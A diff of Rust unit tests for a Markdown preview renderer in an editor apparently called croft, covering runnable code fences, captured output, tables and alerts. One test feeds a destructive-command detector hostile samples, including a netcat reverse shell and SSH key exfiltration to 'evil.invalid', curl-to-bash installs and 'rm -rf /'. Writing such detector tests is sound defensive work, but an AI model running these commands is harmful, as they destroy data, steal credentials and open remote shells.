+        let var = "```sh\n$HOME/bin/tool --flag\n$(which ls) -1\n```\n";
+        assert_eq!(
+            run_codes(var),
+            vec!["$HOME/bin/tool --flag\n$(which ls) -1\n"]
+        );
+        // A prompt-looking line that is not the first one is the script's.
+        let later = "```bash\nset -e\n$ not-a-prompt\n```\n";
+        assert_eq!(run_codes(later), vec!["set -e\n$ not-a-prompt\n"]);
+    }
+
+    /// #1473 negative: a `console` fence with no prompt line has nothing
+    /// to run (it is all output), so it wears no play glyph.
+    #[test]
+    fn a_console_fence_with_no_prompt_is_not_runnable() {
+        let md = "```console\nREADME.md\nsrc\n```\n";
+        assert!(run_codes(md).is_empty());
+        let empty = "```console\n$\n```\n";
+        assert!(run_codes(empty).is_empty());
+    }
+
+    /// #1473: the destructive check reads the commands, not the output,
+    /// so sample output can neither raise nor hide the red warning.
+    #[test]
+    fn a_console_fence_is_judged_destructive_by_its_commands() {
+        let mut reg = crate::highlight::LangRegistry::new();
+        let quiet = "```console\n$ ls\nrm -rf /tmp/x\n```\n";
+        let (_, _, runs) =
+            render_markdown_full(quiet, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert!(!runs[0].destructive, "output that mentions rm is not run");
+        let loud = "```console\n$ sudo rm -rf /tmp/x\n```\n";
+        let (_, _, runs) =
+            render_markdown_full(loud, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert!(runs[0].destructive);
+    }
+
+    /// #354's first acceptance criterion: a run that printed `hi` and
+    /// exited 3 shows `hi` under the block and says the exit was bad.
+    #[test]
+    fn a_captured_run_shows_its_output_and_a_bad_exit_under_the_block() {
+        let md = "```sh\necho hi; exit 3\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+
+        // Nothing has been run, so the document renders as it always did.
+        let (before, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs.len(), 1);
+        let joined = |ls: &[Line<'static>]| -> String {
+            ls.iter()
+                .map(|l| {
+                    l.spans
+                        .iter()
+                        .map(|s| s.content.as_ref())
+                        .collect::<String>()
+                })
+                .collect::<Vec<_>>()
+                .join("\n")
+        };
+        assert!(
+            !joined(&before).contains("Output"),
+            "an unrun block has no box: {}",
+            joined(&before)
+        );
+
+        let mut outputs = BlockOutputs::new();
+        outputs.insert(
+            runs[0].lines.0,
+            BlockOutput {
+                text: String::from("hi\n"),
+                exit: Some(3),
+                timed_out: false,
+            },
+        );
+        let (after, _, _) = render_markdown_full(md, Theme::default(), &mut reg, None, outputs);
+        let text = joined(&after);
+        assert!(text.contains("Output"), "{text}");
+        assert!(text.contains("hi"), "the captured output is shown: {text}");
+        assert!(
+            text.contains("exit 3"),
+            "a non-zero exit is named, not just implied: {text}"
+        );
+    }
+
+    /// A capture that gave up says so, and says the process did not.
+    #[test]
+    fn a_timed_out_capture_says_the_block_is_still_running() {
+        let md = "```sh {timeout=1}\nsleep 60\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (_, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs[0].capture_timeout, Some(1), "{:?}", runs[0]);
+        let mut outputs = BlockOutputs::new();
+        outputs.insert(
+            runs[0].lines.0,
+            BlockOutput {
+                text: String::new(),
+                exit: None,
+                timed_out: true,
+            },
+        );
+        let (after, _, _) = render_markdown_full(md, Theme::default(), &mut reg, None, outputs);
+        let text: String = after
+            .iter()
+            .map(|l| {
+                l.spans
+                    .iter()
+                    .map(|s| s.content.as_ref())
+                    .collect::<String>()
+            })
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(text.contains("still running"), "{text}");
+        assert!(
+            text.contains("stopped waiting"),
+            "the box says the PROCESS was not stopped, only the wait: {text}"
+        );
+    }
+
+    /// `{persist}` writes exactly ONE output fence and replaces it on the
+    /// next run, never touching another fence (#354).
+    #[test]
+    fn an_output_fence_is_written_once_and_then_replaced() {
+        let doc = "# T\n\n```sh\necho hi\n```\n\nprose after\n\n```sh\necho other\n```\n";
+        // The `sh` opener is line 2 (0-based), counting the heading and the
+        // blank line before it.
+        let first = replace_output_fence(doc, 2, "hi\n").expect("the opener is a fence");
+        assert_eq!(
+            first.matches(OUTPUT_MARKER).count(),
+            1,
+            "exactly one output fence: {first}"
+        );
+        assert!(first.contains("```text\nhi\n```"), "{first}");
+        assert!(
+            first.contains("prose after") && first.contains("echo other"),
+            "the rest of the document survives: {first}"
+        );
+
+        // A second run REPLACES rather than stacking, and the other fence
+        // is still untouched.
+        let second = replace_output_fence(&first, 2, "bye\n").expect("still a fence");
+        assert_eq!(
+            second.matches(OUTPUT_MARKER).count(),
+            1,
+            "still exactly one: {second}"
+        );
+        assert!(second.contains("bye"), "{second}");
+        assert!(
+            !second.contains("```text\nhi\n"),
+            "the old output is gone: {second}"
+        );
+        assert_eq!(
+            second.matches("echo other").count(),
+            1,
+            "the unrelated fence is untouched: {second}"
+        );
+    }
+
+    /// A line that is no longer a fence opener means the document moved
+    /// under the capture, and a write there would land on whatever now
+    /// occupies that line.
+    #[test]
+    fn a_stale_block_line_refuses_rather_than_writing_somewhere_else() {
+        let doc = "# T\n\nprose, not a fence\n\n```sh\necho hi\n```\n";
+        assert_eq!(
+            replace_output_fence(doc, 2, "hi\n"),
+            None,
+            "line 2 is prose now, so there is nothing to attach an output to"
+        );
+        assert_eq!(
+            replace_output_fence(doc, 99, "hi\n"),
+            None,
+            "and a line past the end is refused rather than appended to"
+        );
+    }
+
+    /// Output that itself contains a fence must not escape its own (#354).
+    ///
+    /// A command whose output mentions Markdown prints ``` and, with a
+    /// three-backtick wrapper, closes the fence croft just opened: the rest
+    /// of the capture becomes prose and the document's structure is wrong
+    /// from there down. The wrapper is widened past the longest backtick run
+    /// in the output, and the replace path finds a closer of any width.
+    #[test]
+    fn output_containing_a_fence_does_not_escape_it() {
+        let doc = "```sh\ncat README.md\n```\n\nprose after\n";
+        let printed = "here is a fence:\n```\nnested\n```\ndone\n";
+        let first = replace_output_fence(doc, 0, printed).expect("the opener is a fence");
+        assert!(
+            first.contains("````text"),
+            "the wrapper is wider than the output's own fence: {first}"
+        );
+        assert!(first.contains("nested"), "{first}");
+        assert!(
+            first.contains("prose after"),
+            "the document past the block survives: {first}"
+        );
+
+        // And the widened fence is still found and replaced next time.
+        let second = replace_output_fence(&first, 0, "quiet\n").expect("still a fence");
+        assert_eq!(
+            second.matches(OUTPUT_MARKER).count(),
+            1,
+            "the wide fence was replaced, not stacked: {second}"
+        );
+        assert!(!second.contains("nested"), "{second}");
+        assert!(second.contains("prose after"), "{second}");
+    }
+
+    /// A `~~~` line INSIDE a backtick block is content, not that block's
+    /// closer (#354 review).
+    ///
+    /// A runbook that heredocs a tilde-fenced snippet was having the output
+    /// fence injected into the middle of its shell script, stranding the
+    /// heredoc terminator and everything after it outside the block. A fence
+    /// is closed only by its own delimiter.
+    #[test]
+    fn a_tilde_line_inside_a_backtick_block_is_not_its_closer() {
+        let doc = "```sh\ncat <<EOF\n~~~\nsnippet\n~~~\nEOF\n```\n\nprose after\n";
+        let out = replace_output_fence(doc, 0, "done\n").expect("the opener is a fence");
+        assert!(
+            out.contains("cat <<EOF") && out.contains("EOF\n```"),
+            "the script survives whole, terminator included: {out}"
+        );
+        // The marker lands after the BLOCK's closer, not inside the heredoc.
+        let marker_at = out.find(OUTPUT_MARKER).expect("written");
+        let script_end = out.find("EOF\n```").expect("the block closes");
+        assert!(
+            marker_at > script_end,
+            "the output fence goes after the block, not into it: {out}"
+        );
+        assert!(out.contains("prose after"), "{out}");
+    }
+
+    /// A `~~~`-opened runnable fence is a fence (#354 review).
+    ///
+    /// It was refused, and refused with the WRONG reason: "the document
+    /// changed since the block ran", about a line that is a perfectly good
+    /// opener. The renderer never distinguished the delimiters, so those
+    /// blocks are runnable and their captures must be writable.
+    #[test]
+    fn a_tilde_opened_block_takes_an_output_fence() {
+        let doc = "~~~sh\necho hi\n~~~\n\nprose after\n";
+        let out = replace_output_fence(doc, 0, "FIRSTRUN\n").expect("`~~~` opens a fence too");
+        assert!(out.contains(OUTPUT_MARKER), "{out}");
+        // Pin the delimiter EXACTLY. This was
+        // `contains("~~~text") || contains("~~~~text")`, whose second arm is a
+        // substring case of its first — `"~~~text"` occurs inside `"~~~~text"`,
+        // so arm 1 is true whenever arm 2 is and the OR could only widen
+        // acceptance. It passed for a four-tilde fence, which is the
+        // wrong-delimiter case the message claims to reject (verified: both a
+        // three- and a four-tilde output satisfied the old form). The emitted
+        // fence is the block's own opener plus `text`, one determinate value,
+        // so an exact line match is available and an OR was never needed.
+        assert!(
+            out.lines().any(|l| l == "~~~text"),
+            "the output fence uses the block's own delimiter, exactly `~~~text`: {out}"
+        );
+        assert!(
+            !out.lines().any(|l| l == "~~~~text"),
+            "a four-tilde fence is the wrong delimiter for a `~~~` block: {out}"
+        );
+        assert!(out.contains("FIRSTRUN"), "{out}");
+        assert!(out.contains("prose after"), "{out}");
+
+        // And replacing it finds the tilde closer rather than giving up.
+        let second = replace_output_fence(&out, 0, "bye\n").expect("still a fence");
+        assert_eq!(second.matches(OUTPUT_MARKER).count(), 1, "{second}");
+        assert!(second.contains("bye"), "{second}");
+        assert!(
+            !second.contains("FIRSTRUN"),
+            "the previous capture was replaced, not kept: {second}"
+        );
+    }
+
+    /// A CRLF document keeps its line endings (#354 review).
+    ///
+    /// `split_inclusive('\n')` keeps the `\r`, so writing bare LF would
+    /// splice mixed endings into a file that had none - which git, diffs
+    /// and editors all notice, and which the user did not ask for.
+    #[test]
+    fn a_crlf_document_gets_crlf_back() {
+        let doc = "```sh\r\necho hi\r\n```\r\n\r\nprose after\r\n";
+        let out = replace_output_fence(doc, 0, "hi\n").expect("the opener is a fence");
+        let inserted: Vec<&str> = out
+            .lines()
+            .filter(|l| l.contains(OUTPUT_MARKER) || l.contains("text") || *l == "hi")
+            .collect();
+        assert!(!inserted.is_empty(), "{out}");
+        assert!(
+            !out.split("\r\n").any(|seg| seg.contains('\n')),
+            "every line ending is CRLF, none bare: {out:?}"
+        );
+        assert!(out.contains("prose after"), "{out}");
+    }
+
+    /// A hand-written fence below the block is not croft's to replace: only
+    /// a fence carrying the marker is.
+    #[test]
+    fn an_unmarked_following_fence_is_left_alone() {
+        let doc = "```sh\necho hi\n```\n\n```text\nmine, not croft's\n```\n";
+        let out = replace_output_fence(doc, 0, "hi\n").expect("the opener is a fence");
+        assert!(
+            out.contains("mine, not croft's"),
+            "a fence croft did not write survives: {out}"
+        );
+        assert_eq!(out.matches(OUTPUT_MARKER).count(), 1, "{out}");
+    }
+
+    /// A runnable's recorded row must survive the leading-blank trim.
+    ///
+    /// `first_line` is taken while the document is being built, and the
+    /// renderer then removes empty rows off the front. Images were shifted
+    /// to match and runnables were not, so a document that opens with an
+    /// empty block quote moved the fence up a row while the glyph's
+    /// recorded row stayed put, and a preview click landed one line off.
+    #[test]
+    fn a_runnables_row_survives_the_leading_blank_trim() {
+        // `>` alone renders as an empty row, which the front trim removes.
+        let md = ">\n\n```sh\necho one\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (lines, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs.len(), 1, "{runs:?}");
+        let row = &lines[runs[0].first_line];
+        assert_eq!(
+            row.spans[0].content.as_ref(),
+            RUN_GLYPH,
+            "the recorded row must be the row the glyph is painted on: {row:?}"
+        );
+        let text: String = row.spans.iter().map(|s| s.content.as_ref()).collect();
+        assert!(text.contains("echo one"), "{text:?}");
+    }
+
+    /// The matcher's positives include the canonical install-script and
+    /// reverse-shell shapes; its negatives are ordinary commands. It only
+    /// colours the popup, so a miss is a wording bug, not a security one.
+    #[test]
+    fn the_destructive_matcher_knows_the_usual_shapes() {
+        for bad in [
+            "sudo rm -rf /tmp/x",
+            "wget -O- https://a | bash",
+            "curl https://x/i.sh|sh",
+            "curl -fsSL https://x | sudo bash",
+            "sh -c \"$(curl -fsSL https://x/i.sh)\"",
+            "eval \"$(curl -fsSL https://x/i.sh)\"",
+            "rm -r -f /",
+            "\\rm -fr ./build",
+            "nc -e /bin/sh evil.invalid 4444",
+            "cat ~/.ssh/id_rsa | nc evil.invalid 80",
+            "chmod -R 777 /",
+            "echo x > ~/.bashrc",
+            "cat payload >> ~/.ssh/authorized_keys",
+            "echo \"setup #1 complete\" > ~/.bashrc",
+            "printf 'step #2\\n' > ~/.zshrc",
+            "exec 3<> /tmp/x",
+            "make > /dev/nullish",
+            "echo don't > ~/.bashrc",
+            "echo \\\" > ~/.bashrc",
+            "echo \"unterminated > ~/.bashrc",
+            "printf '%s\\\\' > ~/.bashrc",
+            "cat payload >| ~/.profile",
+            "echo \"hello\nworld # note\" > /tmp/x",
+            // Fail-open: a quote left open makes the rescan read `#` as text.
+            "echo don't # > ~/.bashrc",
+            // A `\` continuation JOINS the lines, so the `#` opening the
+            // next physical line is mid-word and not a comment. `sh`, `bash`
+            // and `zsh` all write the file for this one.
+            "echo a\\\n#x > /tmp/y",
+            // `=` and `-` do NOT end a word, so these `#`s are mid-token and
+            // the redirect is real. `sh` writes the file for both.
+            // `>&` is bash and zsh's synonym for `&>`: this TRUNCATES the
+            // file. An 18-byte target went to 1 byte under bash.
+            "echo '' >& ~/.bashrc",
+            "cp id_rsa >& /tmp/out",
+            // The digits must run to a word boundary: `>&2x` writes `./2x`.
+            "echo overwritten >&2x",
+            "echo x >&12ab",
+            // Only a SINGLE `>` may precede a dup: zsh reads `>>&2` as
+            // append-both-streams to the file `./2`.
+            "echo appended >>&2",
+            // The two passes can only ADD a flag, never clear one: an
+            // unterminated quote makes pass 1 give up, and the quote-blind
+            // rescan then sees the `#` as text rather than a comment.
+            "echo \" # > /tmp/y",
+            "echo a=#x > /tmp/y",
+            "echo a-#x > /tmp/y",
+            "git push --force",
+            "git reset --hard HEAD~3",
+        ] {
+            assert!(looks_destructive(bad), "{bad:?} should be flagged");
+        }
+        for ok in [
+            "cargo build --release",
+            "ls -la | grep foo",
+            "curl https://example.com/api | jq .",
+            "rm build.log",
+            "echo hello",
+            "python3 -m http.server",
+            "cargo test 2>&1 | tail",
+            // The paired control: `&` followed by a DIGIT is a real
+            // descriptor dup and writes no file.
+            "echo a >&2",
+            "exec 2>&-",
+            "echo a >&2 && echo done",
+            "echo a >&2; echo done",
+            "make >/dev/null",
+            "echo a -> b",
+            "ls # see https://x -> y",
+            "echo '> quoted' # not a redirect",
+            "echo \"a > b\"",
+            "make >/dev/null 2>&1",
+            "echo hi # writes > nothing\necho done",
+            // A SPACE before the backslash ends the word, so the `#` on the
+            // next line really does start a comment. Paired with the
+            // positive above so the continuation rule cannot be
+            // over-applied: the two differ by exactly that space.
+            "echo a \\\n#x > /tmp/y",
+            // A shell operator ends a word, so a `#` straight after one opens
+            // a comment and the `>` behind it never runs. Probed against `sh`
+            // with a control (the same line without the `#`) that does write.
+            "echo a|#x > /tmp/y",
+            "echo a;#x > /tmp/y",
+            "echo a &#x > /tmp/y",
+            "echo a)#x > /tmp/y",
+            // A `>` genuinely inside a multi-line string writes nothing, and
+            // `sh` agrees. Nothing pinned this direction before.
+            "echo \"open\necho x > ~/.bashrc\nmore\"",
+            "if [ 3 -gt 2 ]; then echo yes; fi",
+        ] {
+            assert!(!looks_destructive(ok), "{ok:?} is ordinary");
+        }
+    }
+
+    #[test]
+    fn fenced_rust_block_gets_tree_sitter_colours() {
+        let lines = render("```rust\nfn main() {}\n```");
+        let code_line = lines
+            .iter()
+            .find(|l| text_of(l).contains("fn main"))
+            .expect("the code line must render");
+        let keyword = code_line
+            .spans
+            .iter()
+            .find(|s| s.content.as_ref().trim() == "fn")
+            .expect("the fn keyword must be its own span");
+        assert_eq!(
+            keyword.style.fg,
+            Some(Color::Rgb(0xB4, 0x8E, 0xAD)),
+            "the fenced block must carry the editor's keyword colour"
+        );
+    }
+
+    /// The colour the preview gives `word` on the code line containing
+    /// `line` in a fence tagged `info`; `None` when it is not its own span
+    /// or carries no colour of its own.
+    fn fence_keyword_colour(info: &str, line: &str, word: &str) -> Option<Color> {
+        let lines = render(&format!("```{info}\n{line}\n```"));
+        let code_line = lines.iter().find(|l| text_of(l).contains(line))?;
+        code_line
+            .spans
+            .iter()
+            .find(|s| s.content.as_ref().trim() == word)?
+            .style
+            .fg
+    }
+
+    /// #1642: rustdoc and mdBook attributes after a comma, and Pandoc's
+    /// braces, are not part of the language.
+    #[test]
+    fn fence_attributes_do_not_hide_the_language() {
+        for info in [
+            "rust,ignore",
+            "rust,no_run",
+            "rust,should_panic",
+            "Rust,editable",
+        ] {
+            assert_eq!(lang_for_fence(info), Some(LangKind::Rust), "{info}");
+        }
+        for info in [
+            "{python}",
+            "{.python}",
+            "{.python .numberLines}",
+            "{python echo=false}",
+            "{#example .python .numberLines}",
+            "{ #example .python }",
+            "{.python #example}",
+            "python,linenos",
+        ] {
+            assert_eq!(lang_for_fence(info), Some(LangKind::Python), "{info}");
+        }
+        assert_eq!(lang_for_fence("{r, echo=FALSE}"), lang_for_fence("r"));
+    }
+
+    /// The issue's chapter: each block is coloured like the same block
+    /// tagged with the bare language.
+    #[test]
+    fn the_preview_colours_fences_that_carry_attributes() {
+        let rust = fence_keyword_colour("rust", "fn main() {}", "fn");
+        assert!(rust.is_some(), "a plain rust fence is coloured");
+        for info in ["rust,ignore", "rust,no_run"] {
+            assert_eq!(
+                fence_keyword_colour(info, "fn main() {}", "fn"),
+                rust,
+                "{info}"
+            );
+        }
+        let python = fence_keyword_colour("python", "def f(): return 1", "def");
+        assert!(python.is_some(), "a plain python fence is coloured");
+        for info in ["{python}", "{.python .numberLines}"] {
+            assert_eq!(
+                fence_keyword_colour(info, "def f(): return 1", "def"),
+                python,
+                "{info}"
+            );
+        }
+    }
+
+    /// Negative: fences with no language, or one croft does not know, stay
+    /// plain, attributes or not.
+    #[test]
+    fn fences_without_a_known_language_stay_plain() {
+        for info in [
+            "",
+            "text",
+            "text,ignore",
+            "{}",
+            "{.}",
+            "{#example}",
+            "{#example linenos=true}",
+            ",rust",
+            "nosuchlang,rust",
+        ] {
+            assert_eq!(lang_for_fence(info), None, "{info:?}");
+        }
+        assert_eq!(
+            fence_keyword_colour("text,ignore", "fn main() {}", "fn"),
+            None
+        );
+    }
+
+    #[test]
+    fn lists_nest_with_indentation_and_ordered_counters() {
+        let lines = render("- top\n  - inner\n\n1. first\n2. second");
+        let text = all_text(&lines);
+        assert!(text.contains("\u{2022} top"), "got:\n{text}");
+        assert!(text.contains("  \u{2022} inner"), "got:\n{text}");
+        assert!(text.contains("1. first"), "got:\n{text}");
+        assert!(text.contains("2. second"), "got:\n{text}");
+    }
+
+    #[test]
+    fn task_list_markers_render_as_checkboxes() {
+        let text = all_text(&render("- [x] done\n- [ ] todo"));
+        assert!(text.contains("\u{2611} done"), "got:\n{text}");
+        assert!(text.contains("\u{2610} todo"), "got:\n{text}");
+    }
+
+    #[test]
+    fn blockquote_carries_the_bar_prefix() {
+        let text = all_text(&render("> quoted wisdom"));
+        assert!(text.contains("\u{258e} quoted wisdom"), "got:\n{text}");
+    }
+
+    /// #1386: a GitHub alert opens with a title row in its colour, the bar
+    /// takes that colour, the body reads as plain text, and the `[!KIND]`
+    /// marker is gone.
+    #[test]
+    fn a_github_alert_draws_a_coloured_title_row_without_its_marker() {
+        let lines = render("> [!WARNING]\n> text");
+        let rows: Vec<String> = lines.iter().map(text_of).collect();
+        assert_eq!(rows, ["\u{258e} \u{ea6c} Warning", "\u{258e} text"]);
+        // One cell per glyph: the icon must not push the title right.
+        assert_eq!(cells(&rows[0]), 11);
+        let warning = Theme::default().ui(Color::Rgb(0xcc, 0xa7, 0x00));
+        for line in &lines {
+            assert_eq!(line.spans[0].style.fg, Some(warning), "bar of {line:?}");
+        }
+        let title = lines[0].spans[1].style;
+        assert_eq!(title.fg, Some(warning));
+        assert!(title.add_modifier.contains(Modifier::BOLD));
+        let body = lines[1].spans[1].style;
+        assert!(!body.add_modifier.contains(Modifier::ITALIC), "{body:?}");
+        for (marker, title) in [
+            ("NOTE", "Note"),
+            ("TIP", "Tip"),
+            ("IMPORTANT", "Important"),
+            ("CAUTION", "Caution"),
+        ] {
+            let rows: Vec<String> = render(&format!("> [!{marker}]\n> body"))
+                .iter()
+                .map(text_of)
+                .collect();
+            assert!(rows[0].ends_with(&format!(" {title}")), "{rows:?}");
+            assert_eq!(rows[1..], ["\u{258e} body"], "{marker}");
+        }
+    }
+
+    /// #1386 negative: a plain quote, and one whose `[!KIND]` GitHub does
+    /// not know, stay muted quotes that keep every word.
+    #[test]
+    fn a_plain_quote_or_an_unknown_alert_kind_stays_a_plain_quote() {
+        for (md, row) in [
+            ("> quoted wisdom", "\u{258e} quoted wisdom"),
+            ("> [!UNKNOWN]\n> text", "\u{258e} [!UNKNOWN] text"),
+        ] {
+            let lines = render(md);
+            let rows: Vec<String> = lines.iter().map(text_of).collect();
+            assert_eq!(rows, [row]);
+            assert_eq!(lines[0].spans[0].style.fg, Some(Theme::default().ui(DIM)));
+            let body = lines[0].spans[1].style;
+            assert!(body.add_modifier.contains(Modifier::ITALIC), "{md:?}");
+        }
+    }
+
+    /// #1386 review: the rows a code block or a table builds itself keep the
+    /// alert's bar, so they stay inside the callout, and a runnable fence's
+    /// play glyph still takes the row's first cell, where a click on it is
+    /// looked for.
+    #[test]
+    fn code_and_table_rows_inside_an_alert_keep_its_bar() {
+        let warning = Theme::default().ui(Color::Rgb(0xcc, 0xa7, 0x00));
+        let lines = render(
+            "> [!WARNING]\n> ```rust\n> let x = 1;\n> ```\n>\n> | a | b |\n> | - | - |\n> | 1 | 2 |",
+        );
+        let rows: Vec<String> = lines.iter().map(text_of).collect();
+        let row = |needle: &str| {
+            lines
+                .iter()
+                .find(|l| text_of(l).contains(needle))
+                .unwrap_or_else(|| panic!("{needle:?} in {rows:?}"))
+        };
+        assert_eq!(text_of(row("let x = 1;")), "\u{258e} \u{258e} let x = 1;");
+        for needle in [
+            "let x = 1;",
+            "a \u{2502} b",
+            "\u{2500}\u{253c}\u{2500}",
+            "1 \u{2502} 2",
+        ] {
+            assert_eq!(row(needle).spans[0].style.fg, Some(warning), "{needle:?}");
+        }
+        let run = render("> [!TIP]\n> ```sh\n> make dev\n> ```");
+        let first = run
+            .iter()
+            .find(|l| text_of(l).contains("make dev"))
+            .expect("code row");
+        assert_eq!(first.spans[0].content.as_ref(), RUN_GLYPH, "{first:?}");
+        assert_eq!(text_of(first), format!("{RUN_GLYPH}\u{258e} make dev"));
+    }
+
+    #[test]
+    fn table_columns_pad_to_the_widest_cell() {
+        let lines = render("| name | value |\n| --- | --- |\n| a | long-value |\n| bbbb | c |");
+        let text = all_text(&lines);
+        assert!(text.contains("name \u{2502} value"), "got:\n{text}");
+        assert!(
+            text.contains("a    \u{2502} long-value"),
+            "cells must pad to the widest column; got:\n{text}"
+        );
+        assert!(
+            text.contains("\u{2500}\u{253c}\u{2500}"),
+            "a rule must separate the header; got:\n{text}"
+        );
+    }
+
+    #[test]
+    fn table_columns_follow_the_delimiter_row_alignment() {
+        // #861: `---:` right-aligns, `:---:` centres (the odd cell of slack
+        // on the right), and `:---` and `---` stay on the left.
+        let lines = render(
+            "| item | amount | note | kind |\n\
+             | :--- | ---: | :---: | --- |\n\
+             | rent | 1200 | due | x |\n\
+             | tea | 5 | ok, paid | yy |",
+        );
+        let rows: Vec<String> = lines.iter().map(text_of).collect();
+        let row = |first: &str| {
+            rows.iter()
+                .find(|r| r.starts_with(first))
+                .unwrap_or_else(|| panic!("no row starting {first:?} in {rows:#?}"))
+                .clone()
+        };
+        assert_eq!(
+            row("item"),
+            "item \u{2502} amount \u{2502}   note   \u{2502} kind"
+        );
+        assert_eq!(
+            row("rent"),
+            "rent \u{2502}   1200 \u{2502}   due    \u{2502} x   "
+        );
+        assert_eq!(
+            row("tea"),
+            "tea  \u{2502}      5 \u{2502} ok, paid \u{2502} yy  "
+        );
+    }
+
+    #[test]
+    fn a_wide_character_row_keeps_its_separators_in_line() {
+        // #861: `食費` is two characters but four cells; padding by
+        // character count put this row's `│` two columns right of the rest.
+        let lines =
+            render("| category | amount |\n| --- | ---: |\n| 食費 (food) | 300 |\n| rent | 1200 |");
+        let seams: Vec<(String, usize)> = lines
+            .iter()
+            .map(text_of)
+            .filter_map(|t| {
+                let at = t.find(['\u{2502}', '\u{253c}'])?;
+                Some((t.clone(), cells(&t[..at])))
+            })
+            .collect();
+        assert_eq!(seams.len(), 4, "header, rule and two rows: {seams:#?}");
+        assert!(
+            seams.iter().all(|(_, col)| *col == seams[0].1),
+            "every row's seam must sit on the same screen column: {seams:#?}"
+        );
+        let widths: Vec<usize> = seams.iter().map(|(t, _)| cells(t)).collect();
+        assert!(
+            widths.iter().all(|w| *w == widths[0]),
+            "every row must end on the same column: {seams:#?}"
+        );
+    }
+
+    #[test]
+    fn a_wide_character_cell_is_padded_by_screen_cells() {
+        // #861, read off the rendered text alone: `食費 (food)` is nine
+        // characters but eleven cells, so its column is eleven cells wide
+        // and every shorter cell is padded out to it.
+        let lines =
+            render("| category | amount |\n| --- | --- |\n| 食費 (food) | 300 |\n| rent | 1200 |");
+        let rows: Vec<String> = lines
+            .iter()
+            .map(text_of)
+            .filter(|t| t.contains('\u{2502}'))
+            .collect();
+        assert_eq!(
+            rows,
+            [
+                "category    \u{2502} amount",
+                "食費 (food) \u{2502} 300   ",
+                "rent        \u{2502} 1200  ",
+            ]
+        );
+    }
+
+    #[test]
+    fn a_combining_mark_takes_no_cell_in_a_table() {
+        // #861 guard, the other way round from a wide character: `café`
+        // spelled with a combining accent is five characters but four
+        // cells, and must not be padded as five.
+        let lines = render("| name | n |\n| --- | --- |\n| cafe\u{301} | 1 |\n| tea | 2 |");
+        let rows: Vec<String> = lines
+            .iter()
+            .map(text_of)
+            .filter(|t| t.contains('\u{2502}'))
+            .collect();
+        assert_eq!(
+            rows,
+            [
+                "name \u{2502} n",
+                "cafe\u{301} \u{2502} 1",
+                "tea  \u{2502} 2",
+            ]
+        );
+    }
+
+    #[test]
+    fn a_missing_cell_in_an_aligned_column_is_blank_padding() {
+        // #861 guard: a row that stops short leaves a blank cell as wide as
+        // its column, whatever the column's alignment, so the seams of the
+        // rows below do not move.
+        let lines = render("| a | b |\n| --- | ---: |\n| x |\n| yy | 12 |");
+        let rows: Vec<String> = lines
+            .iter()
+            .map(text_of)
+            .filter(|t| t.contains('\u{2502}'))
+            .collect();
+        assert_eq!(rows, ["a  \u{2502}  b", "x  \u{2502}   ", "yy \u{2502} 12"]);
+    }
+
+    #[test]
+    fn a_tables_alignment_does_not_carry_into_the_next_table() {
+        // #861 guard: the delimiter row's alignment belongs to its own
+        // table. A plain table after a right-aligned one is left-aligned.
+        let lines =
+            render("| n |\n| ---: |\n| 1 |\n| 100 |\n\ntext\n\n| m |\n| --- |\n| 1 |\n| 100 |");
+        let rows: Vec<String> = lines.iter().map(text_of).collect();
+        let ones: Vec<&String> = rows.iter().filter(|r| r.trim() == "1").collect();
+        assert_eq!(
+            ones,
+            ["  1", "1  "],
+            "right-aligned in the first table, left in the second: {rows:#?}"
+        );
+    }
+
+    #[test]
+    fn links_underline_and_rules_draw() {
+        let lines = render("see [the docs](https://example.com)\n\n---");
+        let link = lines[0]
+            .spans
+            .iter()
+            .find(|s| s.content.as_ref() == "the docs")
+            .expect("link text must render");
+        assert!(link.style.add_modifier.contains(Modifier::UNDERLINED));
+        assert!(all_text(&lines).contains(&"\u{2500}".repeat(RULE_COLS)));
+    }
+
+    /// #1385: YAML or TOML front matter is metadata for the site generator,
+    /// hidden as VS Code's preview hides it, not a rule, a run-on paragraph
+    /// and a setext heading. The body's lines still map to their source for
+    /// scroll sync.
+    #[test]
+    fn front_matter_is_hidden_and_the_body_keeps_its_source_lines() {
+        let rule = "\u{2500}".repeat(RULE_COLS);
+        let md = "---\ntitle: Release notes\ndate: 2026-10-01\ntags: [a, b]\n---\n\n\
+                  Body text.\n\n## What's new\n";
+        let mut reg = LangRegistry::new();
+        let (lines, _, _, map, _) =
+            render_markdown_mapped(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        let text = all_text(&lines);
+        assert_eq!(text_of(&lines[0]), "Body text.", "{text}");
+        assert!(text.contains("What's new"), "{text}");
+        for absent in ["title", "2026-10-01", "tags", rule.as_str()] {
+            assert!(!text.contains(absent), "{absent:?} rendered: {text}");
+        }
+        assert_eq!(built_line_for_source(&map, 6), Some(0), "{map:?}");
+
+        let text = all_text(&render(
+            "+++\ntitle = \"Hugo\"\ndraft = false\n+++\n\nBody.\n",
+        ));
+        assert_eq!(text.trim(), "Body.");
+    }
+
+    /// #1385 negative: only the first line opens front matter. A `---`
+    /// further down is still a rule, and text over one still a heading.
+    #[test]
+    fn a_later_rule_and_setext_heading_still_render() {
+        let rule = "\u{2500}".repeat(RULE_COLS);
+        let text = all_text(&render("Intro\n\n---\n\nkey: value\n---\n\nAfter\n"));
+        assert!(text.contains(&rule), "{text}");
+        assert!(text.contains("key: value"), "{text}");
+        assert!(text.contains("After"), "{text}");
+        let lines = render("Intro\n\nSetext\n---\n");
+        let heading = lines
+            .iter()
+            .flat_map(|l| l.spans.iter())
+            .find(|s| s.content.as_ref() == "Setext")
+            .expect("the setext heading renders");
+        assert!(heading.style.add_modifier.contains(Modifier::BOLD));
+    }
+
+    #[test]
+    fn code_block_text_follows_the_theme_palette_not_base16() {
+        // A fence in a language the highlighter doesn't know (and any gap the
+        // highlighter leaves) must paint the ACTIVE theme's code foreground.
+        // The hardcoded Base16 slate left cold-grey code islands inside an
+        // otherwise-themed Gruvbox/Dracula preview.
+        let theme = *crate::theme::Theme::all()
+            .iter()
